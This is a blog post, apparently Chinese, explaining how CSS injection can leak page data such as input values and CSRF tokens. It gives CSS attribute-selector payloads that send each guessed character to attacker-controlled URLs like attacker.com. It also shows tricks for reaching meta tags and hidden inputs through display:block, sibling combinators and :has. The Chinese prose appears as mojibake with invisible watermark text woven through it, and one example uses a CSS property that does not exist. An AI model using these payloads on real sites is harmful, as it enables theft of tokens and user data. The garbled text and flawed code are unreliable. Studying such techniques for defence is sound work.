<!DOCTYPE html>
<html lang="zh-CN" color-mode="light">

  <head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <meta name="author" content="s3ven" />
  <!-- Open Graph Description ç®€çŸ­æ‘˜è¦-->
  
  <meta property="og:site_name" content="s3ven&#39;s blog">
  
  
  <!-- ç”¨äºæœç´¢å¼•æ“çš„æ–‡ç« æ‘˜è¦ -->
  
  
  
  <title>é€šè¿‡ CSS Injection å®ç°ä¿¡æ¯æ³„éœ² | s3ven&#39;s blog</title>

  
    <link rel="apple-touch-icon" href="/images/favicon.png">
    <link rel="icon" href="/images/favicon.png">
  

  <!-- Font -->
  <link href="https://npm.elemecdn.com/lxgw-wenkai-webfont/style.css" rel="stylesheet" >
  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">

  <!-- hexo site css -->
  <link rel="stylesheet" href="/css/main.css" />
  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
  <!-- ä»£ç å—é£æ ¼ -->
  

  <!-- jquery3.3.1 -->
  
    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
  

  <!-- fancybox -->
  
    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
  
  
<script src="../../js/fancybox.js"></script>


  

  

  <script>
    var html = document.documentElement
    const colorMode = localStorage.getItem('color-mode')
    if (colorMode) {
      document.documentElement.setAttribute('color-mode', colorMode)
    }
  </script>
<meta name="generator" content="Hexo 7.3.0"></head>


  <body>
    <div id="app">
      <div class="header">
  <div class="avatar">
    <a href="/">
      <!-- å¤´åƒå–æ¶ˆæ‡’åŠ è½½ï¼Œæ·»åŠ no-lazy -->
      
        <img src="/images/avatar.png" alt="">
      
    </a>
    <div class="nickname"><a href="/">s3ven's blog</a></div>
  </div>
  <div class="navbar">
    <ul>
      
        <li class="nav-item" data-path="/">
          <a href="/">Home</a>
        </li>
      
        <li class="nav-item" data-path="/archives/">
          <a href="/archives/">Archives</a>
        </li>
      
        <li class="nav-item" data-path="/categories/">
          <a href="/categories/">Categories</a>
        </li>
      
        <li class="nav-item" data-path="/tags/">
          <a href="/tags/">Tags</a>
        </li>
      
        <li class="nav-item" data-path="/links/">
          <a href="/links/">Links</a>
        </li>
      
        <li class="nav-item" data-path="/about/">
          <a href="/about/">About</a>
        </li>
      
    </ul>
  </div>
</div>


<script src="../../js/activeNav.js"></script>



      <div class="flex-container">
        
  <!-- LaTex Display -->

  
    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
  
  <script>
    MathJax = {
      tex: {
        inlineMath: [['$', '$'], ['\\(', '\\)']]
      }
    }
  </script>





  <!-- clipboard -->

  
    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
  
  
<script src="../../js/codeCopy.js"></script>







  

  

  

  
  <div class="container-wider post-details" id="post-details">
    <div class="zoom-wrap">
      <div class="post-content">
        <div class="post-title">é€šè¿‡ CSS Injection å®ç°ä¿¡æ¯æ³„éœ²</div>
        <div class="post-attach">
          <span class="post-pubtime">
            <i class="iconfont icon-updatetime mr-10" title="åˆ›å»ºæ—¶é—´"></i>
            2023-12-13
          </span>
          
                <span class="post-categories">
                  <i class="iconfont icon-bookmark mr-10" title="åˆ†ç±»"></i>
                  
                  <span class="span--category">
                    <a href="../../categories/skill/" title="Skill">
                      Skill
                    </a>
                  </span>
                  
                </span>
            
                <span class="post-tags">
                  <i class="iconfont icon-tags mr-10" title="æ ‡ç­¾"></i>
                  
                  <span class="span--tag mr-8">
                    <a href="../../tags/css/" title="CSS">
                      #CSS
                    </a>
                  </span>
                  
                </span>
            
        </div>
        <div class="markdown-body">
          
<style id="hexo-wm">
.hexo-wm {
  color: transparent !important;
  opacity: 0 !important;
  font-size: 0 !important;
  line-height: 0 !important;
  pointer-events: none !important;
  user-select: text !important;
  -webkit-user-select: text !important;
  speak: none !important;
  vertical-align: baseline !important;
  display: inline !important;
}

.hexo-wm * { color: transparent !important; opacity: 0 !important; }
</style>
<html><head></head><body><p>CSS Injection é€šè¿‡åˆ©ç”¨ <code>CSS Selectors</code> åŒ¹é…å’Œé€‰æ‹©é¡µé¢å…ƒç´ çš„<span class="hexo-wm">ğ˜´â€ï»¿â‘¶â…´eğ˜¯.â€‹êœ±iâ€ğ­ğ˜¦â€‹â€‹</span>åŠŸèƒ½æ¥å®ç°é¡µé¢ä¿¡æ¯çš„æ³„éœ²</p>
<h2 id="1-åŸºç¡€ç”¨æ³•"><a href="#1-åŸºç¡€ç”¨æ³•" class="headerlink" title="1. åŸºç¡€ç”¨æ³•"></a>1. åŸºç¡€ç”¨æ³•</h2><p>å‡è®¾æ­¤æ—¶ <code>target.com</code> çš„ç›®æ ‡é¶æœºä¸Š<span class="hexo-wm">Ñ•ï»¿Â³ğ’—ğ˜¦ï½â€¤ï»¿êœ±â…ˆâ€ğ˜µeâ€‹â€‹</span>å­˜åœ¨ä»¥ä¸‹å†…å®¹</p>
<pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>somevalue<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span></code></pre>
<p>å¦‚æœæƒ³è¦å¾—åˆ° input å…ƒç´ çš„ valueï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ <code>target.com</code> ä¸ŠåŠ è½½å¦‚ä¸‹ css ï¼š</p>
<pre class="language-css" data-language="css"><code class="language-css"><span class="token selector">input[value^=a]</span><span class="token punctuation">{</span>
    <span class="token property">background-image</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>https://attacker.com/?value=a<span class="token punctuation">)</span></span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token selector">input[value^=b]</span><span class="token punctuation">{</span>
    <span class="token property">background-image</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>https://attacker.com/?value=b<span class="token punctuation">)</span></span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token comment">/* ... */</span>
<span class="token selector">input[value^=9]</span><span class="token punctuation">{</span>
    <span class="token property">background-image</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>https://attacker.com/?value=9<span class="token punctuation">)</span></span><span class="token punctuation">;</span>   
<span class="token punctuation">}</span></code></pre>
<p><code>value^=X</code> æ˜¯ä¸€ä¸ª <code>CSS Selectors</code> è¡¨è¾¾å¼ï¼Œå®ƒå°†åŒ¹é…æ‰€æœ‰ç›®æ ‡ç±»å‹ä¸­åŒ…å«å±æ€§ <span class="hexo-wm">Ñ•ï»¿ï»¿â‘¶â…´â„¯ğ’.ï»¿sğ¢ï»¿tğ˜¦â€</span>value ä¸”å…¶å€¼ä»¥å‰ç¼€ <code>X</code> å¼€å¤´çš„å…ƒç´ ï¼ŒåŒæ—¶ä½¿ç”¨ç›®æ ‡æ ·å¼æ¸²æŸ“è¢«é€‰æ‹©çš„å…ƒç´ ã€‚</p>
<p>ç”±äºæ ·å¼ä¸­æŒ‡å®šäº† <code>background-image: url()</code> ï¼Œè¿™å°†è§¦å‘é¡µé¢å¯¹ç›®æ ‡ url <code>attacker.com/?value=s</code> çš„ HTTP <span class="hexo-wm">ğ˜€â€Œï»¿Â³ğ¯eï½.â€êœ±ğ¢â€‹â€tï½…â€</span>è¯·æ±‚ï¼Œæ­¤æ—¶æˆ‘ä»¬é€šè¿‡åœ¨ <code>attacker.com</code> ä¸Šçš„è¯·æ±‚æ—¥å¿—å°±å¯ä»¥å¾—çŸ¥ value ä»¥ <code>s</code> å¼€å¤´ï¼Œ</p>
<p>ç„¶åæˆ‘ä»¬é‡æ–°åŠ è½½ <code>target.com</code> ï¼Œä½†ä½¿ç”¨å¦‚ä¸‹ CSSï¼š</p>
<pre class="language-css" data-language="css"><code class="language-css"><span class="token selector">input[value^=sa]</span><span class="token punctuation">{</span>
    <span class="token property">background-image</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>https://attacker.com/?value=sa<span class="token punctuation">)</span></span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token selector">input[value^=sb]</span><span class="token punctuation">{</span>
    <span class="token property">background-image</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>https://attacker.com/?value=sb<span class="token punctuation">)</span></span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token comment">/* ... */</span>
<span class="token selector">input[value^=s9]</span><span class="token punctuation">{</span>
    <span class="token property">background-image</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>https://attacker.com/?value=s9<span class="token punctuation">)</span></span><span class="token punctuation">;</span>   
<span class="token punctuation">}</span></code></pre>
<p>è¿™ä¼šå¯¼è‡´é¡µé¢è¯·æ±‚ <code>attacker.com/?value=so</code>,<br>æœ€ç»ˆï¼Œåœ¨é‡å¤æ­¤æ¨¡å¼å‡ <span class="hexo-wm">ğ˜´â€â€‹ğŸ¯ğ’—ğğ§Â·â€êœ±ğ¢â€tâ„®â€‹â€</span>æ¬¡åï¼Œæœ€ç»ˆè¯·æ±‚ <code>attacker.com/?value=somevalue</code> å°†å…è®¸æˆ‘ä»¬äº†è§£ç›®æ ‡é¡µé¢ä¸­ input å…ƒç´ çš„ value å±æ€§å€¼ã€‚</p>
<h2 id="2-å‡å°‘è§„åˆ™æ•°é‡"><a href="#2-å‡å°‘è§„åˆ™æ•°é‡" class="headerlink" title="2. å‡å°‘è§„åˆ™æ•°é‡"></a>2. å‡å°‘è§„åˆ™æ•°é‡</h2><p>ç”±äº CSS Selectors åŒ…å« <code>value*=X</code> è¡¨è¾¾å¼ï¼Œ<br>å¯ä»¥åŒ¹é…ä»»ä½•åŒ…å«å±æ€§ <span class="hexo-wm">sï»¿â€Â³â…´ğnâ€¢â€â€Œğ˜€ï½‰ï»¿ï½”eâ€‹â€</span>value ä¸”å…¶å€¼åŒ…å« <code>X</code> å­—ç¬¦çš„å…ƒç´ ï¼Œ<br>å› æ­¤æˆ‘ä»¬å¯ä»¥é¢„å…ˆç¡®å®šç»„æˆç›®æ ‡å±æ€§å€¼çš„å­—ç¬¦é›†ï¼Œæ¥å‡å°‘è·å¾—ç›®æ ‡å±æ€§å€¼æ‰€éœ€çš„è§„åˆ™æ•°é‡ã€‚</p>
<p>ä¾‹å¦‚ï¼Œä¸Šé¢çš„æ ·ä¾‹ä¸­ä»…ä½¿ç”¨äº†å­—ç¬¦â€œs,o,m,e,v,a,l,u,eâ€ï¼Œ<br>å› æ­¤æˆ‘ä»¬å¯ä»¥å‡å°‘æ‰€éœ€çš„<span class="hexo-wm">sâ€‹â€ŒğŸ¯ğ’—â„®ğ’.ï»¿ğ˜´â…ˆâ€â€ğ’•eâ€Œâ€‹</span>è§„åˆ™æ•°é‡è‡³æ¯ä¸ªå­—ç¬¦9ä¸ªè§„åˆ™ã€‚</p>
<h2 id="3-åŠ é€Ÿæ³„éœ²"><a href="#3-åŠ é€Ÿæ³„éœ²" class="headerlink" title="3. åŠ é€Ÿæ³„éœ²"></a>3. åŠ é€Ÿæ³„éœ²</h2><p>å¦‚æœç›®æ ‡ä¿¡æ¯è¿‡é•¿ï¼Œé€å­—å…ƒæ³„éœ²çš„é€Ÿåº¦å¯èƒ½è¿‡æ…¢ï¼Œ<br>äº‹å®ä¸Šï¼Œæˆ‘ä»¬å¯ä»¥ä¸€æ¬¡æ³„éœ²ä¸¤ä¸ªå­—å…ƒï¼š<br>ç”±äº CSS Selectors ä¸ä»…åŒ…å« prefix selector: <code>value^=X</code>ï¼Œ<br>è¿˜åŒ…å« suffix <span class="hexo-wm">ğ˜´â€‹â€‹â‘¶vâ„¯nâ€¢â€ï»¿êœ±ï½‰â€Œtğ˜¦ï»¿</span>selector: <code>value$=X</code> è¡¨è¾¾å¼ï¼Œ<br>å› æ­¤æˆ‘ä»¬å¯ä»¥è¿™æ ·æ¥ä¸€æ¬¡è·å–ä¸¤ä¸ªå­—å…ƒï¼š</p>
<pre class="language-css" data-language="css"><code class="language-css"><span class="token selector">input[name="secret"][value^="a"]</span> <span class="token punctuation">{</span>
  <span class="token property">background</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>https://b.myserver.com/leak?q=a<span class="token punctuation">)</span></span>
<span class="token punctuation">}</span>

<span class="token selector">input[name="secret"][value^="b"]</span> <span class="token punctuation">{</span>
  <span class="token property">background</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>https://b.myserver.com/leak?q=b<span class="token punctuation">)</span></span>
<span class="token punctuation">}</span>

<span class="token selector">// ...
input[name="secret"][value$="a"]</span> <span class="token punctuation">{</span>
  <span class="token property">border-background</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>https://b.myserver2.com/suffix?q=a<span class="token punctuation">)</span></span>
<span class="token punctuation">}</span>

<span class="token selector">input[name="secret"][value$="b"]</span> <span class="token punctuation">{</span>
  <span class="token property">border-background</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>https://b.myserver2.com/suffix?q=b<span class="token punctuation">)</span></span>
<span class="token punctuation">}</span></code></pre>
<p>æ³¨æ„æ­¤å¤„å‰åç¼€é€‰æ‹©å™¨çš„ä¸¤ä¸ªå±æ€§éœ€è¦åˆ†åˆ«ä½¿ç”¨ <code>background</code> å’Œ <code>border-background</code>ï¼Œ<br>å› ä¸ºå¦‚æœä½¿ç”¨åŒä¸€å±æ€§ï¼Œ<span class="hexo-wm">êœ±ï»¿â€3ğ˜·ï½…nâˆ™â€â€êœ±ğ¢ï»¿tï½…ï»¿ï»¿</span>åœ¨å¤šæ¬¡åŒ¹é…åˆ°ç›¸åŒå…ƒç´ æ ·å¼æ—¶ä»…æœ€åä¸€ä¸ªä¼šç”Ÿæ•ˆå¹¶ä¼šè¢«è¯·æ±‚</p>
<h2 id="4-meta-æ ‡ç­¾-ä¿¡æ¯æ³„éœ²"><a href="#4-meta-æ ‡ç­¾-ä¿¡æ¯æ³„éœ²" class="headerlink" title="4. meta æ ‡ç­¾ ä¿¡æ¯æ³„éœ²"></a>4. meta æ ‡ç­¾ ä¿¡æ¯æ³„éœ²</h2><p>ç”±äºéƒ¨åˆ†ä¿¡æ¯ä¼šè¢«ç½‘ç«™å­˜å‚¨äº <span class="hexo-wm">Ñ•ï»¿â€‹ğŸ¯ğ¯ğnÂ·â€‹â€ğ˜´iâ€ï½”â„®â€Œâ€Œ</span>meta æ ‡ç­¾ä¸­ï¼Œ<br>è€Œ meta æ ‡ç­¾åœ¨é¡µé¢ä¸­å¾€å¾€æ˜¯å¤„äºä¸å¯è§çš„çŠ¶æ€çš„ï¼Œ<br>å¤§éƒ¨åˆ†æµè§ˆå™¨ä¸ä¼šæ¸²æŸ“ä¸å¯è§çš„ meta æ ‡ç­¾ï¼Œ<br>å› æ­¤å®ƒçš„æ ·å¼çš„å¤–éƒ¨èµ„æºä¸ä¼šè¢«æµè§ˆå™¨æ£€ç´¢ï¼Œ<br>ä½¿ç”¨å¸¸è§„çš„ <code>background-imageurl</code> æ–¹æ³•åœ¨ <code>attacker.com</code> ä¸Šä¸ä¼šæ”¶åˆ°ä»»ä½•è¯·æ±‚ï¼Œ<br>ä½†æ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡ CSS è®©è¿™ä¸ªå…ƒç´ å˜ä¸ºå¯è§çŠ¶æ€ï¼š</p>
<pre class="language-css" data-language="css"><code class="language-css"><span class="token selector">meta</span> <span class="token punctuation">{</span>
  <span class="token property">display</span><span class="token punctuation">:</span> block<span class="token punctuation">;</span>  
<span class="token punctuation">}</span>

<span class="token selector">meta[name="csrf-token"][content^="a"]</span> <span class="token punctuation">{</span>
  <span class="token property">background</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>https://example.com?q=a<span class="token punctuation">)</span></span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>ä½†æ˜¯å¦‚æœè¿›è¡Œå°è¯•ï¼Œ<span class="hexo-wm">ğ’”ï»¿â€ŒğŸ¯ğ˜·ğ˜¦ğ˜¯â€¢â€‹â€ğ’”â…ˆâ€Œğ˜µâ„®â€Œâ€</span>æˆ‘ä»¬å‘ç°è¯·æ±‚è¿˜æ˜¯è¢«æ²¡æœ‰é€å‡ºï¼Œ<br>è¿™æ˜¯å› ä¸º meta åœ¨ head åº•ä¸‹ï¼Œè€Œ head ä¹Ÿæœ‰é¢„è®¾çš„ <code>display:none</code> å±æ€§ï¼Œ<br>å› æ­¤ä¹Ÿè¦ç»™ head è®¾ç½®å¯è§æ ·å¼ï¼Œæ‰èƒ½è®© meta å¯è§ï¼š</p>
<pre class="language-css" data-language="css"><code class="language-css"><span class="token selector">head, meta</span> <span class="token punctuation">{</span>
  <span class="token property">display</span><span class="token punctuation">:</span> block<span class="token punctuation">;</span>  
<span class="token punctuation">}</span>

<span class="token selector">meta[name="csrf-token"][content^="a"]</span> <span class="token punctuation">{</span>
  <span class="token property">background</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>https://example.com?q=a<span class="token punctuation">)</span></span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>

<h2 id="5-ç»•è¿‡-type-hidden-å±æ€§é™åˆ¶"><a href="#5-ç»•è¿‡-type-hidden-å±æ€§é™åˆ¶" class="headerlink" title="5. ç»•è¿‡ type=hidden å±æ€§é™åˆ¶"></a>5. ç»•è¿‡ type=hidden å±æ€§é™åˆ¶</h2><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/action<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>csrf-token<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>abc123<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>username<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span></code></pre>
<p>åœ¨ä»¥ä¸Šç¤ºä¾‹ä¸­ï¼Œç”±äº input å…ƒç´ çš„ type æ˜¯ hiddenï¼Œæ‰€ä»¥è¿™ä¸ªå…ƒç´ ä¸ä¼šæ˜¾ç¤ºåœ¨é¡µé¢ä¸Šï¼Œ<br>ä¸ meta æ ‡ç­¾ä¸€æ ·ï¼Œå¤§éƒ¨åˆ†æµè§ˆå™¨ä¸ä¼šæ¸²æŸ“ type ä¸º hidden çš„å…ƒç´ ï¼Œ<br>å› æ­¤è¯¥å…ƒç´ æ ·å¼çš„å¤–éƒ¨èµ„æºä¸ä¼šè¢«æµè§ˆå™¨æ£€ç´¢ï¼Œæˆ‘ä»¬åœ¨ <code>attacker.com</code> ä¸Šä¹Ÿå°±ä¸ä¼šæ”¶åˆ°ä»»ä½•è¯·æ±‚ã€‚<br>è€Œè¿™ä¸ªé™åˆ¶éå¸¸ä¸¥<span class="hexo-wm">ğ˜€â€ŒÂ³vâ„¯ğ’.â€‹â€sâ…ˆâ€‹ï»¿tâ„®â€ï»¿</span>æ ¼ï¼Œå°±ç®—ç”¨ <code>display:block !important;</code> ä¹Ÿæ²¡åŠæ³•è¦†ç›–</p>
<p>è¿™ä¸ªé—®é¢˜å¯ä»¥é€šè¿‡ CSS <span class="hexo-wm">ğ˜´â€Œâ‘¶ğ’—ï½…ğ’â€¤ï»¿Ñ•â…ˆâ€ğ­ğâ€‹</span>ä¸­çš„ ç›¸é‚»åŒçº§ç»„åˆå™¨ ï¼ˆ+ï¼‰å’Œ é€šç”¨åŒçº§ç»„åˆå™¨ï¼ˆ~ï¼‰æ¥è§£å†³</p>
<h3 id="5-1-CSS-ç›¸é‚»åŒçº§ç»„åˆå™¨ï¼ˆ-ï¼‰"><a href="#5-1-CSS-ç›¸é‚»åŒçº§ç»„åˆå™¨ï¼ˆ-ï¼‰" class="headerlink" title="5.1 CSS ç›¸é‚»åŒçº§ç»„åˆå™¨ï¼ˆ+ï¼‰"></a>5.1 CSS ç›¸é‚»åŒçº§ç»„åˆå™¨ï¼ˆ+ï¼‰</h3><blockquote>
<p>ç›¸é‚»åŒçº§ç»„åˆå™¨é€‰æ‹©å™¨å…è®¸æ‚¨é€‰æ‹©ç´§<span class="hexo-wm">ğ’”ï»¿ï»¿â‘¶ğ¯eğ§Â·<span class="hexo-wm">ğ˜´ï»¿ï»¿ğŸ¯â…´ğ˜¦ğ§â€¢â€‹â€ŒÑ•ğ¢â€Œï»¿ğ˜µğ˜¦â€‹â€‹</span>â€Œâ€Œğ¬ğ¢â€ğ˜µï½…â€</span>è·Ÿåœ¨ä¸€ä¸ªç‰¹å®šå…ƒç´ ä¹‹åçš„å…ƒç´ ã€‚</p>
</blockquote>
<pre class="language-css" data-language="css"><code class="language-css"><span class="token selector">p + p</span> <span class="token punctuation">{</span><span class="token punctuation">}</span> <span class="token comment">/* é€‰æ‹©ä¸€ä¸ªæ®µè½ä¹‹åçš„åŒçº§ä¸”ç»§æ‰¿äºå®ƒçš„æ‰€æœ‰æ®µè½ */</span></code></pre>

<p><img src="image-1.png" alt="image-1.png"></p>
<h3 id="5-2-CSS-é€šç”¨åŒçº§ç»„åˆå™¨ï¼ˆ-ï¼‰"><a href="#5-2-CSS-é€šç”¨åŒçº§ç»„åˆå™¨ï¼ˆ-ï¼‰" class="headerlink" title="5.2 CSS é€šç”¨åŒçº§ç»„åˆå™¨ï¼ˆ~ï¼‰"></a>5.2 CSS é€šç”¨åŒçº§ç»„åˆå™¨ï¼ˆ~ï¼‰</h3><blockquote>
<p>é€šç”¨åŒçº§è¿ç®—å™¨é€‰æ‹©å™¨ä¸åˆšæ‰çš„<span class="hexo-wm">Ñ•ï»¿â€â‘¶ğ˜·eğ˜¯<span class="hexo-wm">ğ¬â€â€ŒğŸ¯vğğ’âˆ™â€‹êœ±ï½‰â€tâ„®â€Œâ€Œ</span>âˆ™â€ŒÑ•ï½‰â€‹â€ğ˜µâ„®â€</span>ç›¸é‚»åŒçº§è¿ç®—å™¨é€‰æ‹©å™¨éå¸¸ç›¸ä¼¼ã€‚<br>ä¸åŒä¹‹å¤„åœ¨äºï¼Œè¢«é€‰ä¸­çš„å…ƒç´ ä¸éœ€è¦ç«‹å³ç»§æ‰¿ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œè€Œæ˜¯å¯ä»¥å‡ºç°åœ¨å®ƒä¹‹åçš„ä»»ä½•ä½ç½®ã€‚</p>
</blockquote>
<pre class="language-css" data-language="css"><code class="language-css"><span class="token selector">p ~ p</span> <span class="token punctuation">{</span><span class="token punctuation">}</span> <span class="token comment">/* é€‰æ‹©ä¸€ä¸ªæ®µè½ä¹‹ååŒçº§çš„æ‰€æœ‰æ®µè½ */</span></code></pre>
<p>å¦‚æœæˆ‘ä»¬ä½¿ç”¨ä¸ä¸Šé¢ç›¸åŒçš„ç¤ºä¾‹ç»“æ„ï¼Œæœ€åä¸€ä¸ª <code>&lt;p&gt;</code>å…ƒç´ ä¹Ÿå°†ç”± p ~ p é€‰æ‹©ï¼Œ<span class="hexo-wm">êœ±â€Â³ğ¯â„¯ğ˜¯.â€Œêœ±â…ˆâ€‹â€ğ­eâ€</span>å› ä¸ºå®ƒå‰é¢æ˜¯å¦ä¸€ä¸ª <code>&lt;p&gt;</code> å…ƒç´ ï¼Œå³ä½¿ä¸æ˜¯ç›´æ¥çš„ã€‚</p>
<p><img src="image-2.png" alt="image-2.png"></p>
<p>åˆ©ç”¨ ç›¸é‚»åŒçº§ç»„åˆå™¨ ï¼ˆ+ï¼‰å’Œ é€šç”¨ç»„åˆè¿ç®—å™¨ï¼ˆ~ï¼‰ï¼Œ<br>æˆ‘ä»¬å¯ä»¥æ¸²æŸ“ä¸  <code>input[type=hidden]</code> åŒçº§çš„å…¶ä»–æ²¡æœ‰ <code>type=hidden</code> å±æ€§çš„ in<span class="hexo-wm">ğ’”ï»¿Â³ğ’—ğğ’.â€‹ğ’”ï½‰ï»¿ğ’•ğâ€‹â€</span>put å…ƒç´ ï¼Œ<br>æ¥å®ç°é€šè¿‡ <code>background-imageurl</code> çš„ä¿¡æ¯æ³„éœ²ï¼Œä»è€Œç»•è¿‡ <code>type=hidden</code> é™åˆ¶</p>
<h3 id="5-3-CSS-has-é€‰æ‹©å™¨"><a href="#5-3-CSS-has-é€‰æ‹©å™¨" class="headerlink" title="5.3 CSS :has é€‰æ‹©å™¨"></a>5.3 CSS :has é€‰æ‹©å™¨</h3><p>ä¸éš¾å‘ç°ï¼Œç›¸é‚»åŒçº§ç»„åˆ<span class="hexo-wm">ğ˜´ï»¿â€ŒğŸ¯â…´ï½…ğ˜¯.ï»¿êœ±â…ˆâ€‹ï»¿ğ­â„®â€‹</span>å™¨å’Œé€šç”¨åŒçº§ç»„åˆå™¨åªèƒ½åœ¨ç›®æ ‡ <code>type=hidden</code> çš„å…ƒç´ ä¹‹åå­˜åœ¨æ²¡æœ‰ <code>type=hidden</code> æ ‡è®°çš„åŒçº§å…ƒç´ æ—¶æ‰èƒ½å®ç°ä¿¡æ¯æ³„éœ²ï¼Œ<br>è€Œå¦‚æœç›®æ ‡å…ƒç´ ä¹‹åä¸å­˜åœ¨æ»¡è¶³æ¡ä»¶çš„åŒçº§å…ƒç´ æ—¶ï¼Œæˆ‘ä»¬åˆ™éœ€è¦ä½¿ç”¨ :has é€‰æ‹©å™¨æ¥å®ç°ä¿¡æ¯æ³„éœ²</p>
<blockquote>
<p>:has é€‰æ‹©å™¨ <span class="hexo-wm">Ñ•â€‹â‘¶ğ’—ï½…ğ§âˆ™â€sâ…ˆï»¿â€ğ’•â„®â€Œ</span>å¯ä»¥é€‰æ‹©åŒ…å«ç‰¹å®šå†…å®¹çš„å…ƒç´ ã€‚<br>ä¾‹å¦‚ï¼Œ<code>a:has(img)</code>å¯ä»¥é€‰æ‹©æ‰€æœ‰åŒ…å«å­å…ƒç´ <code>&lt;img&gt;</code>çš„<code>&lt;a&gt;</code>å…ƒç´ ã€‚</p>
</blockquote>
<p>å› æ­¤ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨ä»¥<span class="hexo-wm">Ñ•â€ï»¿â‘¶ğ˜·ï½…ğ§ï¼â€‹ğ˜´ï½‰â€ğ˜µâ„®â€‹â€Œ</span>ä¸‹ CSSï¼š</p>
<pre class="language-css" data-language="css"><code class="language-css"><span class="token selector">form:has(input[name="csrf-token"][value^="a"])</span><span class="token punctuation">{</span>
  <span class="token property">background</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>https://example.com?q=a<span class="token punctuation">)</span></span>
<span class="token punctuation">}</span></code></pre>
<p>è¯¥ CSS å°†é€‰ä¸­åŒ…å«ç¬¦åˆæ¡ä»¶çš„ input çš„ form ï¼Œå¹¶å°†å…¶æ¸²æŸ“ä¸ºå¯¹åº”æ ·å¼ï¼Œ<br>ç”±äºè¢«æ¸²æŸ“çš„å…ƒç´ ä¸º <code>form</code> ï¼Œæ•…å¯ä»¥ç»•è¿‡ input <span class="hexo-wm">êœ±â€‹â€‹â‘¶veï½â€¢â€‹sâ…ˆâ€Œğ’•â„®â€‹â€‹</span>çš„ hidden å±æ€§æ¥å®ç°ä¿¡æ¯æ³„éœ²</p>
<h2 id="6-å®æ—¶æ›´æ–°-Style-ä¿¡æ¯æ³„éœ²"><a href="#6-å®æ—¶æ›´æ–°-Style-ä¿¡æ¯æ³„éœ²" class="headerlink" title="6. å®æ—¶æ›´æ–° Style ä¿¡æ¯æ³„éœ²"></a>6. å®æ—¶æ›´æ–° Style ä¿¡æ¯æ³„éœ²</h2><p>åœ¨ä¸Šè¿°ç¤ºä¾‹ä¸­ï¼Œ<span class="hexo-wm">ğ˜€â€â€‹â‘¶ğ’—enâˆ™â€Œsâ…ˆâ€ğ’•ğâ€‹â€Œ</span>å¦‚æœç›®æ ‡ä¿¡æ¯åœ¨é¡µé¢é‡æ–°åŠ è½½åæ›´æ–°ä¼šé‡ç½®ï¼Œ<br>æˆ‘ä»¬å°†åªèƒ½ä½¿ç”¨ CSS è·å–ç›®æ ‡ä¿¡æ¯çš„ç¬¬ä¸€ä¸ªå­—å…ƒã€‚</p>
